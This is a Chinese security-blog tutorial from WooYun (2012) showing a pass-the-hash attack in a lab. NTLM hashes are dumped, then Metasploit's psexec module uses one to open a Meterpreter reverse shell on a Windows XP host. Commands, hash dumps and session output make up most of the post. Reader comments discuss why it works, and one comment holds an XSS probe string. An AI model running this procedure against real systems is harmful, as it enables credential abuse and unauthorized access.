@@ -1,0 +1,222 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">使用Hash直接登录Windows</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">VIP</a> <span class="bull">·</span> <time title="2012/12/28 16:13" ui-time="" datetime="2012/12/28 16:13" class="published ng-binding ng-isolate-scope">2012/12/28 16:13</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p>首先,在本地主机（假设为目标主机）  新建一个wooyun用户,并为之设置密码,然后通过gethashes.exe获取到HASH<pre><code>C:\&gt;net user wooyun test 
+
+The command completed successfully. 
+
+C:\&gt;gethashes.exe $local 
+
+1:1007:C2265B23734E0DACAAD3B435B51404EE:69943C5E63B4D2C104DBBCC15138B72B::: 
+
+Administrator:500:0A174C1272FCBCF7804E0502081BA8AE:83F36A86631180CB9F5F53F5F45DF 
+
+B2B::: 
+
+Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0::: 
+
+HelpAssistant:1000:CF88594C2AC20629EEF3D6DABD2DA92D:0FCE98570CBB9C14E8FF200353B2 
+
+707B::: 
+
+wooyun:1003:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537::: 
+
+SUPPORT_388945a0:1002:AAD3B435B51404EEAAD3B435B51404EE:F9E8AE6C7229EA07EFAC12715 
+
+F954B83::: 
+
+**vmware_user**:1006:AAD3B435B51404EEAAD3B435B51404EE:915D1CEE456EA4DD6A8094F7CE 
+
+094448::: 
+
+C:\&gt; 
+</code></pre>然后我再返回我的BT虚拟机(攻击者主机)使用MSF进行测试，MSF自带的PSEXEC模块具有HASH传递攻击功能<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="75071a1a01351701">[email&#160;protected]</a>:~# msfconsole 
+
+                ##                          ###           ##    ## 
+
+##  ##  #### ###### ####  #####   #####    ##    ####        ######   
+
+
+###### # ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##   
+
+
+###### # ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##   
+
+
+## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##   
+
+
+##   ##  #### ###   #####   #####     ##   ####   ####   #### ###   
+
+
+                                      ## 
+
+       =[ metasploit v3.7.0-release [core:3.7 api:1.0] 
+
++ \-- -|-=[ 684 exploits - 355 auxiliary 
+
++ \-- -|-=[ 217 payloads - 27 encoders - 8 nops 
+
+       =[ svn r12536 updated 76 days ago (2011.05.04) 
+
+Warning: This copy of the Metasploit Framework was last updated 76 days ago. 
+
+         We recommend that you update the framework at least every other day. 
+
+         For information on updating your copy of Metasploit, please see: 
+
+             http://www.metasploit.com/redmine/projects/framework/wiki/Updating 
+
+msf &gt; use exploit/windows/smb/psexec 
+
+msf exploit(psexec) &gt; show options 
+
+Module options (exploit/windows/smb/psexec): 
+
+   Name       Current Setting  Required  Description 
+
+   \---|-       \---|\---|\---|\---|\---|  \---|\---|--  \---|\---|\---|-- 
+
+   RHOST                       yes       The target address 
+
+   RPORT      445              yes       Set the SMB service port 
+
+   SHARE      ADMIN$           yes       The share to connect to, can be an admi                                              n share 
+
+(ADMIN$,C$,...) or a normal read/write folder share 
+
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentic                                              ation 
+
+   SMBPass                     no        The password for the specified username 
+
+   SMBUser                     no        The username to authenticate as 
+
+Exploit target: 
+
+   Id  Name 
+
+   --  \---|- 
+
+   0   Automatic 
+
+msf exploit(psexec) &gt; set RHOST 192.168.0.254 
+
+RHOST =&gt; 192.168.0.254 
+
+msf exploit(psexec) &gt; set SMBUser wooyun 
+
+SMBUser =&gt; wooyun 
+
+msf exploit(psexec) &gt; set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537                                             
+
+SMBPass =&gt; 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537 
+
+msf exploit(psexec) &gt; show options 
+
+Module options (exploit/windows/smb/psexec): 
+
+   Name       Current Setting                                                                                                  Required 
+
+Description 
+
+   \---|-       \---|\---|\---|\---|\---|                                                                                                  \---|\---|--  \---|-- 
+
+\---|\---| 
+
+   RHOST      192.168.0.254                                                                                                    yes       The 
+
+target address 
+
+   RPORT      445                                                                                                              yes       Set 
+
+the SMB service port 
+
+   SHARE      ADMIN$                                                                                                           yes       The 
+
+share to connect to, can be an admin share (ADMIN$,C$,...) or a n                                              ormal read/write folder share 
+
+   SMBDomain  WORKGROUP                                                                                                        no        The 
+
+Windows domain to use for authentication 
+
+   SMBPass    01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537                                                no        The 
+
+password for the specified username 
+
+   SMBUser    wooyun                                                                                                           no        The 
+
+username to authenticate as 
+
+Exploit target: 
+
+   Id  Name 
+
+   --  \---|- 
+
+   0   Automatic 
+
+msf exploit(psexec) &gt; exploit 
+
+[*] Started reverse handler on 192.168.0.3:4444 &lt;/p&gt; 
+[&lt;/em&gt;] Connecting to the server... 
+
+[*] Authenticating to 192.168.0.254:445|WORKGROUP as user 'wooyun'... &lt;/p&gt; 
+[&lt;/em&gt;] Uploading payload... 
+
+[*] Created \UGdecsam.exe... &lt;/p&gt; 
+[&lt;/em&gt;] Binding to 367abb81-9844-35f1-ad32-98f038001003:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1e2c302e5e707d7f7d70">[email&#160;protected]</a>_np:192.168.0.254[\svcctl] ... 
+
+[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="33011d03735d5052505d">[email&#160;protected]</a>_np:192.168.0.254[\svcctl] ... &lt;/p&gt; 
+[&lt;/em&gt;] Obtaining a service manager handle... 
+
+[*] Creating a new service (MZsCnzjn - "MrZdoQwIlbBIYZQJyumxYX")... &lt;/p&gt; 
+[&lt;/em&gt;] Closing service handle... 
+
+[*] Opening service... &lt;/p&gt; 
+[&lt;/em&gt;] Starting the service... 
+
+[*] Removing the service... &lt;/p&gt; 
+[&lt;/em&gt;] Closing service handle... 
+
+[*] Deleting \UGdecsam.exe... &lt;/p&gt; 
+[&lt;/em&gt;] Sending stage (749056 bytes) to 192.168.0.254 
+
+[*] Meterpreter session 1 opened (192.168.0.3:4444 -&gt; 192.168.0.254:1877) at 2011-07-19 03:57:17 +0800 
+
+meterpreter &gt; sysinfo 
+
+Computer        : WOOYUN-PC 
+
+OS              : Windows XP (Build 2600, Service Pack 2). 
+
+Architecture    : x86 
+
+System Language : zh_CN 
+
+Meterpreter     : x86/win32 
+
+meterpreter &gt; shell 
+
+Process 4596 created. 
+
+Channel 1 created. 
+
+Microsoft Windows XP [Version 5.1.2600] 
+
+(C) Copyright 1985-2001 Microsoft Corp. 
+
+C:\WINDOWS\system32&gt;net user 
+
+net user 
+
+User accounts for \ 
+
+\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|- 
+
+**vmware_user**          1                        Administrator 
+
+Guest                    HelpAssistant            wooyun 
+
+SUPPORT_388945a0 
+
+The command completed with one or more errors. 
+
+C:\WINDOWS\system32&gt; 
+</code></pre>至此,我们已经成功获得目标的CMDSHELL</p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/10146" rel="bookmark" id="re1">Meterpreter Guide</a></li><li><a href="http://drops.wooyun.org/tips/2746" rel="bookmark" id="re2">metasploit渗透测试笔记(内网渗透篇)</a></li><li><a href="http://drops.wooyun.org/tools/650" rel="bookmark" id="re3">tunna工具使用实例</a></li><li><a href="http://drops.wooyun.org/tips/646" rel="bookmark" id="re4">得到内网域管理员的5种常见方法</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hei_yu_fa</span> <span class="reply-time">2016-03-30 12:37:11</span></div><p></p><p>我要把乌云从头到尾翻个遍...然后你这个没看明白</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">枯荣</span> <span class="reply-time">2015-08-05 16:17:54</span></div><p></p><p>我把知识库从发的第一个看下去 然后把洞也都看一遍，留名 win7~不可以~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Defa</span> <span class="reply-time">2014-11-26 19:31:04</span></div><p></p><p>[&lt;a href=&quot;test&quot; title=&quot;]&quot;&gt;&lt;/a&gt;[&quot; &lt;!-- onmouseover=alert(/v587/)//&gt;&lt;!-- --&gt;NOT VULNERABLE&lt;a&gt;&lt;/a&gt;]</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Forever80s</span> <span class="reply-time">2013-09-04 22:17:54</span></div><p></p><p>这好像叫hash登录windows系统samba服务器</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">possible</span> <span class="reply-time">2013-08-06 15:47:36</span></div><p></p><p>看着 大牛说的http://lcx.cc/index.asp?i=3257 应该是协议设计允许以hash登录的，正常功能 应该不会有补丁吧？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">yy520</span> <span class="reply-time">2013-04-16 00:46:10</span></div><p></p><p>实际上，打了补丁的2k3也是不行的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">南国利剑</span> <span class="reply-time">2013-04-08 16:11:42</span></div><p></p><p>windows 什么版本的 ，win7的 好像不行了都！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">裙下的秘密</span> <span class="reply-time">2013-01-06 15:25:52</span></div><p></p><p>默认防火墙是开启的连接不上445那 =。=</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冰锋刺客</span> <span class="reply-time">2013-01-06 15:10:05</span></div><p></p><p>详见: http://lcx.cc/index.asp?i=3257<br>“在SMB协议中，如果你想进行一次在服务器上的请求认证，你的密码可以以原码或加密后的形式发送到服务器端。如果服务器支持加密属性，客户端必须发送一个应答信号。在negprot应答数据报中，服务器会给客户端发送一个密钥。然后，客户端将密码加密并通过SesssetupX请求数据报发送到服务器端。服务器将会核查密码的有效性，并由此允许或拒绝客户端的访问。你必须知道一个SMB密码(未加密)的最大长度是14位。密钥的长度一般为8位，加密过后的口令长度为24位。在ANSI密码中，密码中的所有位都转换成大写的形式然后再加密。密码是以DEC编码方式进行加密的。”</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冰锋刺客</span> <span class="reply-time">2013-01-06 15:00:40</span></div><p></p><p>今天又仔细看了一下文章,前4行明显是画蛇添足的<br>[img src="/upload/image/201301/2013010615002943104.gif" alt=".gif"/]</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4bbage</span> <span class="reply-time">2013-01-06 08:53:39</span></div><p></p><p>你搞个6.0及以上的在摆出了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">w5r2</span> <span class="reply-time">2012-12-29 10:58:32</span></div><p></p><p>继续问</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冰锋刺客</span> <span class="reply-time">2012-12-29 01:41:20</span></div><p></p><p>@blue 对啊，原理是什么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">牛奶坦克</span> <span class="reply-time">2012-12-28 16:30:54</span></div><p></p><p>楼上问的好！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blue</span> <span class="reply-time">2012-12-28 16:29:14</span></div><p></p><p>技术原理是什么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">se55i0n</span> <span class="reply-time">2012-12-28 16:28:47</span></div><p></p><p>占个座，慢慢看~</p><p></p></div></div></div></div></div></main>
